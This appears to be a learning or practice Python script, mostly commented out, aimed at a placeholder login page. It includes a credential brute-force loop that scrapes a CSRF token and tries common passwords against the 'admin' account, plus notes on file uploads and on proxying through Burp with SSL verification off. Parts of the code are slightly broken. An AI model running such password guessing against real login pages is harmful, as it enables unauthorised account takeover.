# import requests
# import re

# session = requests.Session() 

# login_url = "http://example.com/login"

# resp = session.get(login_url)

# match = re.search(r'name="csrf_token" value="(.+?)"', resp.text) #Extract CSRF token from login page.

# if not match:
#     print("CSRF token not found!")
#     exit(1)

# # exstablish failure baseline

# data = {
#     "username": "invalid_user",
#     "password": "invalid_pass",
#     "csrf_token": csrf_token
# }
# fail_resp = session.post(login_url, data=data)
# fail_length = len(fail_resp.text)
# print(f"Failure response length: {fail_length}")


# # bruteforce loop

# passwords = ["123456", "password", "admin", "letmein", "welcome"]

# for pwd in passwords:

#     # re-fetch token if app rotates tokens
#     resp = session.get(login_url)
#     csrf_token = re.search(r'name="csrf_token" value="(.+?)"', resp.text).group(1)

#     data = {
#         "username": "admin",
#         "password": pwd,
#         "csrf_token": csrf_token
#     }

#     r = session.post(login_url, data=data)

#     length_changed = len(r.text) != fail_length
#     keyword_found = "logout" in r.text.lower()

#     if length_changed or keyword_found:
#         print(f"[SUCCESS] Password found: {pwd}")
#         break
#     else:
#         print(f"[FAILURE] Tried password: {pwd}")

# # file upload
# files = {
#     "file": ("test.txt", b"Hello World", "text/plain")
# }
# #"file" → name of the <input type="file" name="file">, "test.txt" → filename you claim
# # b"..." → file content (bytes)
# # "text/plain" → MIME type you claim

# # burp style requests and interceptions
# # disable ssl verifications

# # proxies = {
# #     "http://127.0.0.1:8080"
# #     "https://127.0.0.1:8080"
# # }


# # r = requests.get(
# #     "http://example.com",
# #     proxies=proxies,
# #     verify=False
# # )
# # print(r.status_code)


#POST

import requests
session = requests.Session()

proxies = {
    "http":"http://127.0.0.1:8080",
    "https":"https://127.0.0.1:8080"
}

login_url = "http://example.com/login"

data = {
    "username": "monster",
    "password": "123344"
}

r = session.post(
    login_url,
    data=data,
    proxies=proxies,
    verify=False
)

print(len(r.text))